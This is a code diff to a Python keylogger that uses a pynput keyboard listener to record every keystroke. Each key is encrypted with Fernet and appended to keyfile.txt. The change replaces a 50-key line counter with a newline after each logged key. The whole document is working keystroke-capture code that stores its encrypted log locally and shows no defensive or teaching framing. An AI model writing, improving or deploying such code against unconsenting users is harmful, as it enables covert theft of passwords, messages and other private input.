@@ -23,28 +23,26 @@ def get_encryption_key():
 key_count = 0
 
 def keyPressed(key):
-    global key_count
     encryption_key = get_encryption_key()
     cipher_suite = Fernet(encryption_key)
 
     try:
         with open("keyfile.txt", 'ab') as logKey:  # Open in binary mode to write encrypted bytes
-            if key_count >= 50:
-                logKey.write(cipher_suite.encrypt(b'\n'))  # New line every 50 inputs to keep clean
-                key_count = 0
-            try:
-                char = key.char
-                logKey.write(cipher_suite.encrypt(char.encode()))
-            except AttributeError:
-                # Handle special keys
+            if hasattr(key, 'char') and key.char is not None:
+                encrypted_char = cipher_suite.encrypt(key.char.encode())
+                logKey.write(encrypted_char)
+                logKey.write(b'\n')  # Adding a delimiter for each input
+            else:
                 if key == keyboard.Key.space:
-                    logKey.write(cipher_suite.encrypt(b' '))  # When Space is pressed write ' ' instead of key.space
+                    encrypted_space = cipher_suite.encrypt(b' ')
+                    logKey.write(encrypted_space)
+                    logKey.write(b'\n')  # Adding a delimiter for each input
                 else:
-                    logKey.write(cipher_suite.encrypt(f'[{key}]'.encode()))
+                    encrypted_special_key = cipher_suite.encrypt(f'[{key}]'.encode())
+                    logKey.write(encrypted_special_key)
+                    logKey.write(b'\n')  # Adding a delimiter for each input
     except Exception as e:
         print(f"Error logging key: {str(e)}")  
-
-    key_count += 1  
 
     if key == keyboard.Key.esc:
         return False
@@ -55,8 +53,7 @@ if __name__ == "__main__":
     # Ensure the keyfile.txt is empty at the start
     open("keyfile.txt", 'wb').close()  # Open in binary mode to create an empty file
 
-    
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     listener.join()  
-    input()  
+    input() 
